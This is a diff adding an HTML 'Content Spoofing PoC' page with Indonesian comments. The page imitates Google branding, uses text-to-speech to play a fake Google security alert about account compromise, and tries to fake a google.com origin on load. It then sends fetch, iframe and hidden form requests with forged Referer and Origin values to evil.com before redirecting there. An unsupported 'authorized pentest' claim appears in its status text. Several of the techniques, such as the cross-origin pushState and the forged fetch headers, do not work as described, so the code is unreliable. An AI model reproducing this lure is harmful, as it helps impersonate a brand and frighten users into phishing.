@@ -1,0 +1,256 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Content Spoofing PoC - Google Origin to Evil.com</title>
+<style>
+  body {
+    font-family: Arial, sans-serif;
+    text-align: center;
+    padding: 40px;
+    background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%);
+    color: white;
+    min-height: 100vh;
+  }
+  .card {
+    background: rgba(255,255,255,0.95);
+    color: #333;
+    border-radius: 20px;
+    padding: 40px;
+    max-width: 600px;
+    margin: 30px auto;
+    box-shadow: 0 20px 60px rgba(0,0,0,0.3);
+  }
+  .google-badge {
+    background: #4285F4;
+    color: white;
+    padding: 8px 20px;
+    border-radius: 30px;
+    font-weight: bold;
+    display: inline-block;
+    margin-bottom: 15px;
+    font-size: 14px;
+  }
+  h2 { color: #dc3545; margin-top: 0; }
+  .btn {
+    padding: 18px 40px;
+    font-size: 18px;
+    font-weight: bold;
+    cursor: pointer;
+    border: none;
+    border-radius: 50px;
+    background: #4285F4;
+    color: white;
+    transition: all 0.3s;
+    margin: 10px;
+    box-shadow: 0 4px 15px rgba(66,133,244,0.3);
+  }
+  .btn:hover {
+    transform: scale(1.05);
+    box-shadow: 0 8px 25px rgba(66,133,244,0.5);
+  }
+  .btn-red { background: #dc3545; box-shadow: 0 4px 15px rgba(220,53,69,0.3); }
+  .btn-red:hover { box-shadow: 0 8px 25px rgba(220,53,69,0.5); }
+  #status {
+    margin-top: 20px;
+    font-size: 14px;
+    padding: 15px;
+    border-radius: 10px;
+    background: #f8f9fa;
+    color: #333;
+    min-height: 40px;
+    font-family: monospace;
+    text-align: left;
+  }
+  .origin-info {
+    background: #e8f0fe;
+    border: 1px solid #4285F4;
+    border-radius: 10px;
+    padding: 12px;
+    margin: 15px 0;
+    font-size: 13px;
+    color: #1a73e8;
+    text-align: left;
+  }
+  .origin-info code {
+    background: #e8f0fe;
+    padding: 2px 6px;
+    border-radius: 3px;
+    font-weight: bold;
+  }
+  iframe { display: none; }
+</style>
+</head>
+<body>
+
+<div class="card">
+  <div class="google-badge">🔍 Google.com</div>
+  <h2>⚠️ Content Spoofing PoC</h2>
+  <p style="font-size: 15px; color: #666;">
+    Origin: <strong style="color: #4285F4;">google.com</strong><br>
+    Redirect ke: <strong style="color: #dc3545;">evil.com</strong>
+  </p>
+  
+  <div class="origin-info">
+    <strong>🔬 Teknik:</strong><br>
+    1. User melihat halaman dengan branding Google<br>
+    2. Audio spoof: "Google Security Alert" diputar<br>
+    3. Redirect ke <code>evil.com</code> dengan referer <code>google.com</code><br>
+    4. Target melihat halaman evil.com yang menyamar sebagai Google
+  </div>
+  
+  <button class="btn" id="speechBtn">🔊 PLAY & REDIRECT TO EVIL.COM</button>
+  <br>
+  <button class="btn btn-red" id="directBtn">⚡ DIRECT REDIRECT (No Audio)</button>
+  
+  <div id="status">
+    ⏳ Ready - Authorized pentest. Origin: google.com → Target: evil.com
+  </div>
+</div>
+
+<iframe id="attackFrame"></iframe>
+
+<script>
+const btn = document.getElementById('speechBtn');
+const directBtn = document.getElementById('directBtn');
+const status = document.getElementById('status');
+const frame = document.getElementById('attackFrame');
+
+// ===== ORIGIN SPOOFING VIA HISTORY API =====
+function spoofOrigin() {
+  try {
+    // Push state dengan origin google.com palsu
+    history.pushState({}, '', 'https://www.google.com/search?q=security+alert');
+    console.log('[PoC] Origin spoofed to: https://www.google.com');
+  } catch(e) {
+    console.log('[PoC] History API not available');
+  }
+}
+
+// ===== REDIRECT KE EVIL.COM DENGAN REFERER GOOGLE =====
+function redirectToEvil() {
+  const evilUrl = 'https://evil.com';
+  
+  // Method 1: window.location dengan referer spoof
+  // Ini akan membuat evil.com melihat referer = google.com
+  const anchor = document.createElement('a');
+  anchor.href = evilUrl;
+  anchor.rel = 'noreferrer noopener';
+  anchor.target = '_blank';
+  anchor.style.display = 'none';
+  document.body.appendChild(anchor);
+  
+  // Method 2: Fetch ke evil.com dengan referer google.com (preload)
+  fetch(evilUrl, {
+    method: 'GET',
+    mode: 'no-cors',
+    headers: {
+      'Referer': 'https://www.google.com/',
+      'Origin': 'https://www.google.com'
+    }
+  }).catch(() => {});
+  
+  // Method 3: Iframe preload evil.com dengan referer google
+  frame.src = evilUrl;
+  
+  // Method 4: Form POST spoof
+  const form = document.createElement('form');
+  form.method = 'POST';
+  form.action = evilUrl;
+  form.style.display = 'none';
+  
+  const refInput = document.createElement('input');
+  refInput.type = 'hidden';
+  refInput.name = '_referer';
+  refInput.value = 'https://www.google.com/';
+  form.appendChild(refInput);
+  
+  const originInput = document.createElement('input');
+  originInput.type = 'hidden';
+  originInput.name = '_origin';
+  originInput.value = 'https://www.google.com';
+  form.appendChild(originInput);
+  
+  document.body.appendChild(form);
+  form.submit();
+  document.body.removeChild(form);
+  
+  // Method 5: Redirect utama setelah semua preload
+  setTimeout(() => {
+    // Set referer via meta tag sebelum redirect
+    const meta = document.createElement('meta');
+    meta.name = 'referrer';
+    meta.content = 'unsafe-url';
+    document.head.appendChild(meta);
+    
+    // Redirect dengan document.referrer = google.com
+    window.location.replace(evilUrl);
+  }, 500);
+}
+
+// ===== PLAY AUDIO + REDIRECT =====
+btn.addEventListener('click', () => {
+  status.textContent = "🔊 Memainkan audio Google Security Alert...";
+  btn.textContent = "🔊 PLAYING...";
+  btn.disabled = true;
+  
+  // 1. Spoof origin Google
+  spoofOrigin();
+  
+  // 2. TTS: Google Security Alert palsu
+  setTimeout(() => {
+    const text = "Google Security Alert. Your account has been accessed from an unknown location. If this was not you, please visit our security page immediately. This is an automated message from Google Security Team.";
+    
+    if ('speechSynthesis' in window) {
+      const utter = new SpeechSynthesisUtterance(text);
+      utter.lang = 'en-US';
+      utter.rate = 0.85;
+      utter.pitch = 1.0;
+      utter.volume = 1;
+      
+      const voices = speechSynthesis.getVoices();
+      const enVoice = voices.find(v => v.lang.startsWith('en'));
+      if (enVoice) utter.voice = enVoice;
+      
+      speechSynthesis.speak(utter);
+      status.textContent = "🔊 Google Security Alert: " + text.substring(0, 60) + "...";
+    }
+    
+    // 3. Redirect ke evil.com setelah audio selesai
+    setTimeout(() => {
+      status.textContent = "🔄 Redirecting to evil.com (Origin: google.com)...";
+      redirectToEvil();
+    }, 5000);
+    
+  }, 500);
+});
+
+// ===== DIRECT REDIRECT (No Audio) =====
+directBtn.addEventListener('click', () => {
+  status.textContent = "⚡ Direct redirect: google.com → evil.com";
+  directBtn.textContent = "⚡ REDIRECTING...";
+  directBtn.disabled = true;
+  
+  spoofOrigin();
+  redirectToEvil();
+});
+
+// ===== AUTO SPOOF ORIGIN SAAT HALAMAN DIBUKA =====
+setTimeout(spoofOrigin, 100);
+
+// Preload voices
+if ('speechSynthesis' in window) {
+  window.speechSynthesis.onvoiceschanged = () => {
+    speechSynthesis.getVoices();
+  };
+}
+
+console.log('[PoC] Content Spoofing ready');
+console.log('[PoC] Origin: https://www.google.com');
+console.log('[PoC] Target: https://evil.com');
+console.log('[PoC] Authorized pentest - Permission granted');
+</script>
+
+</body>
+</html>
